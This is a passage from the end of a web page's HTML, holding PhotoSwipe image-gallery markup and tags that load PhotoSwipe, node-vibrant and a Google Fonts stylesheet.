            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
